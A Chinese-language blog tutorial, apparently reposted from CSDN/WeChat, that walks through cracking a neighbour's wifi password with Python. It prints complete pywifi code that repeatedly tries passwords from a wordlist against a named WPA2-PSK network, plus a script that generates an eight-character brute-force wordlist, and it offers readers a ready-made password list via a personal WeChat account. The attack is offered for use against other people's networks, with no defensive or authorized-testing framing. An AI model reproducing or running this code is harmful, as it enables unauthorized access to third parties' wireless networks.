
--- 
title:  手把手教你用Python破解邻家小妹wifi密码 
tags: []
categories: [] 

---
<img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2pwZy9QdlA2cWpVcHZJb1A4a1FSZVdHV1JjU1V4ZTNFZXlpYmliYzRuc09Ya1JFamZnSGhmcFBEY3JwT3dRVWljVGdmYzJiaWE3MTM5akVnVGdLUk80RmVGMER4QUEvNjQw?x-oss-process=image/format,png">

今天给大家分享一个

使用Python

破解wifi密码的代码

这个代码也是非常简单

 用Python中的pywifi库

所以需要在DOS命令下安装这个库

同样使用pip install pywifi

很简单就安装成功了

我用的是Python3

所以各位看的时候需要注意这一点

接下来

我们一步一步分析主要代码

后面同样附上完整的代码

对了

需要注意一点

就是电脑必须是要用**无线网卡**

1

获取无线网卡

首先我们需要判断电脑是否已经连接wifi，创建一个无线对象，获取无线网卡。

```
    wifi=pywifi.PyWiFi()

    #获取无线网卡
    ifaces=wifi.interfaces()[0]
    print(ifaces)

```

下面就是效果，但是它返回的是一个对象

<img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9CZHR1SllHaWE5Q05jZW1SaWNiWlpOUXZFOFo4S3hFQlNGR0x2MWtrelpXdERqWHg4ckZNTG8xTGtpYXlpYVJpYzlIN2RvTkxaYnRZYWtHRnhlU0VPZzdZSWh3LzY0MA?x-oss-process=image/format,png">

使用这行代码就可以获取电脑无线网卡的名称：

```
 print(ifaces.name())

```

这个就是我的无线网卡

<img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9CZHR1SllHaWE5Q05jZW1SaWNiWlpOUXZFOFo4S3hFQlNGaWNZTnFlYWV2MjlLOTJkN0xjMUNpYUJiN0FLTVBtR09RcHFmUUFQcFU2ZGdPTHlaYkliajFCR1EvNjQw?x-oss-process=image/format,png">

2

创建连接

要判断是否连接WiFi，我们需要导入一个常量库：

```
 from pywifi import const

```

创建WiFi连接文件，选择要连接WiFi的名称，然后检查WiFi的开发状态，查看wifi的加密算法,一般wifi加密算法为WPA2 PSK，检查加密单元。代码如下：

```
 profile=pywifi.Profile()

 #要连接WiFi的名称

 profile.ssid="jiayi"

 #网卡的开放状态

 profile.auth=const.AUTH_ALG_OPEN

 #wifi加密算法,一般wifi加密算法为was

 profile.akm.append(const.AKM_TYPE_WPA2PSK)

 #加密单元

 profile.cipher=const.CIPHER_TYPE_CCMP

```

删除所有连接过的wifi文件，重新设定新的连接文件，设置wifi连接时间，判断wifi是否连接，若连接，返回4，未连接，返回0.

```
        #删除所有连接过的wifi文件

        ifaces.remove_all_network_profiles()

        #设定新的连接文件

        tep_profile=ifaces.add_network_profile(profile)

        ifaces.connect(tep_profile)

        #wifi连接时间

        time.sleep(3)

        if ifaces.status()==const.IFACE_CONNECTED:

            return True

        else:

            return False

```

3

读取密码本进行破解

接下来我们就需要一个密码本，然后采用只读的方式，一行一行读取，这里的密码本可以用下面代码生成，也用去网上下载一个常用wifi密码，只要是TXT文本就可以。

   

```
    #密码本路径
    path="./password.txt"

    #打开文件
    file=open(path,"r")
    while True:
        try:
            #一行一行读取
            pad=file.readline()

```

<img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2dpZi9MamliNFNvN3l1V2hneEdFNFJYUDVrTEZxQlZ2QklUMEpYWmJpYmV0bGRMY1NwMlU0RXhGWU5mMVVSODF5bVg0azNrYUt3cWZtR25ZZ0hSZklvTWlhZEt1dy82NDA?x-oss-process=image/format,png">

好了

接下来就是完整的代码

破解wifi主体

```
# coding:utf-8
import pywifi
from pywifi import const
import time

#测试连接，返回链接结果
def wifiConnect(pwd):

    #抓取网卡接口
    wifi=pywifi.PyWiFi()

    #获取第一个无线网卡
    ifaces=wifi.interfaces()[0]

    #断开所有连接
    ifaces.disconnect()
    time.sleep(1)
    wifistatus=ifaces.status()

    if wifistatus ==const.IFACE_DISCONNECTED:

        #创建WiFi连接文件
        profile=pywifi.Profile()

        #要连接WiFi的名称
        profile.ssid="aaa你猜"

        #网卡的开放状态
        profile.auth=const.AUTH_ALG_OPEN

        #wifi加密算法,一般wifi加密算法为wps
        profile.akm.append(const.AKM_TYPE_WPA2PSK)

        #加密单元
        profile.cipher=const.CIPHER_TYPE_CCMP

        #调用密码
        profile.key=pwd

        #删除所有连接过的wifi文件
        ifaces.remove_all_network_profiles()

        #设定新的连接文件
        tep_profile=ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)

        #wifi连接时间
        time.sleep(3)

        if ifaces.status()==const.IFACE_CONNECTED:
            return True
        else:
            return False


    else:
        print("已有wifi连接") 

#读取密码本
def readPassword():

    print("开始破解:")
    #密码本路径
    path="./password.txt"

    #打开文件
    file=open(path,"r")

    while True:
        try:
            #一行一行读取
            pad=file.readline()
            bool=wifiConnect(pad)

            if bool:
                print("密码已破解： ",pad)
                print("WiFi已自动连接！！！")
                break
            else:
                #跳出当前循环，进行下一次循环
                print("密码破解中....密码校对: ",pad)
        except:
            continue

readPassword()

```

随机生成密码

```
import itertools as its

# 迭代器
number = "1234567890"
words = "abcdefghijklmnopqrstuvwyz"
te_su = ".!@#$%&amp;*"

# 生成密码本的位数，八位数，repeat=8
r = its.product(number+words+te_su, repeat=8)

# 保存在文件中，追加
dic = open("./password.txt", "a")

# i是元组
for i in r:
    # jion空格链接
    dic.write("".join(i))
    dic.write("".join("\n"))
    print(i)
dic.close()
print("密码本已生成")

```

 看到没有

破解就是这么简单

这里的话密码本生成还是太简单

后面有时间我尝试写一些

常用的姓氏组合密码生成工具

敬请期待

**Tips**

常用wifi密码本

已经为大家准备了一份

如有需要

可以添加我个人微信：**ityard****，**备注******密码本******获取

<img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2pwZy9QdlA2cWpVcHZJb1A4a1FSZVdHV1JjU1V4ZTNFZXlpYmliSVplaWNZNFUyMFUzendKVlFSZzZ3elVnaDMzZU5NNHVjU0hwMFVNV3lBVEVuZ3RlS01YNFduZy82NDA?x-oss-process=image/format,png">

长按识别添加，备注**密码本******

因时间有限，可能回复较慢~

具体教程

<img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9CZHR1SllHaWE5Q05jZW1SaWNiWlpOUXZFOFo4S3hFQlNGQjFMTUZ6cnVsSmJubTJ6YmxUOGVRMkg0VGlid0FxdWRxMlcyR1NEUnNmbVREY1g3V0ZiRm40Zy82NDA?x-oss-process=image/format,png"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2pwZy9CZHR1SllHaWE5Q05jZW1SaWNiWlpOUXZFOFo4S3hFQlNGdHhsMExJaWJpYUxhQ29qdGdrUXQzem56emw0aGNiZldheVhRRlExUFFQSGhLSk53b01ZTTI3V0EvNjQw?x-oss-process=image/format,png"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9CZHR1SllHaWE5Q05jZW1SaWNiWlpOUXZFOFo4S3hFQlNGU1gxTGliQ1d5TElEcU9WZTdPU05XemlhaWJCak1Cd3l4TmpRMWxpYzhKM2dJV3ZZVW5BU0huMWxJQS82NDA?x-oss-process=image/format,png"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9CZHR1SllHaWE5Q05jZW1SaWNiWlpOUXZFOFo4S3hFQlNGbmhBSWljOERtbTUwZUx4RnM4aWE0bW1IZ2pOVGhHTnhJSGxpY1FTR0dUbG5pYXFnY0t3elNYT1l5dy82NDA?x-oss-process=image/format,png"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9CZHR1SllHaWE5Q05jZW1SaWNiWlpOUXZFOFo4S3hFQlNGaWFoemVoM3lpYTdmOGd5aWFtQ1pqSW5WaWFYNERBOW1FVG9iNHdka0RxSDdwRFlpY1BsSkNQcmlhVTJnLzY0MA?x-oss-process=image/format,png"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9CZHR1SllHaWE5Q05jZW1SaWNiWlpOUXZFOFo4S3hFQlNGS3BGNmZidFk3TnZDOTNQOVhwcGlheHdPZmNOTDZBa3E4Yk04b0NKNXBJOHF6OFRYVHppYVJTZUEvNjQw?x-oss-process=image/format,png"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9CZHR1SllHaWE5Q05jZW1SaWNiWlpOUXZFOFo4S3hFQlNGalNaV210M1g2enlQQjZwdW5QdkpSZ3d4M2E0NDFHNXRnakRLb2hUVVNJeFlOOFBNY3ppY0daUS82NDA?x-oss-process=image/format,png"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9CZHR1SllHaWE5Q05jZW1SaWNiWlpOUXZFOFo4S3hFQlNGSFVpYmdRelNycVA2Vm1XdU1yd09qTm5CMVlrbHZoR2pDY3hyRHM2VmplTUR3WjI2OW9LcHBrdy82NDA?x-oss-process=image/format,png"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9CZHR1SllHaWE5Q05jZW1SaWNiWlpOUXZFOFo4S3hFQlNGeFZ6aHA2Q2NPd1AxckRLUGZJanNPSzJSeEJZTnd0YkhpYVZiUGJoWTNiMTlxcThhaWI0bElKT2cvNjQw?x-oss-process=image/format,png"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9CZHR1SllHaWE5Q05jZW1SaWNiWlpOUXZFOFo4S3hFQlNGR0RJTmljWmhSeHMyTmFpYjNWSXJ5cHpFVktBbnZZRW4waWNrOTlMaWJUbEl6cDBzTGNZVGV1V0pzdy82NDA?x-oss-process=image/format,png"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9CZHR1SllHaWE5Q05jZW1SaWNiWlpOUXZFOFo4S3hFQlNGOTRKbXQ1b0VpYm9ONEpBTTJTRDBKZ2JwY3FVVk96ckhRSE1qMFMyeE9Sc1RrMklhU2pPVTlsZy82NDA?x-oss-process=image/format,png"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9CZHR1SllHaWE5Q05jZW1SaWNiWlpOUXZFOFo4S3hFQlNGY2xhYmdUN3dKcFlzNjBLRERFQTNJaWJpYkRmaWFETEpZeWIzdDlwUVlYRThwdWFzaWNlZ0VKQkptUS82NDA?x-oss-process=image/format,png"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9CZHR1SllHaWE5Q05jZW1SaWNiWlpOUXZFOFo4S3hFQlNGZUQ3OU1tSFVqaGljaWN0Sk5pYU9TUUIwQzZEdTcyZm9BcVE4UGYzaWJUZ2V6Tll6S0R5dWNzWU92QS82NDA?x-oss-process=image/format,png">

&lt;&lt;  滑动查看下一张  &gt;&gt;

&lt; END &gt;

<img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2dpZi9QdlA2cWpVcHZJcFh1ZmlibEhVcndWT0loNFg4WWhwYXBpYU1rQk9sSE16b0ZRQm1Qd3dUWEREOG1Dd3pQWEdydUxRbEVBR1VTT3c4aWNQV0FydnRRaWFMTVEvNjQw?x-oss-process=image/format,png">

微信扫码关注，了解更多内容
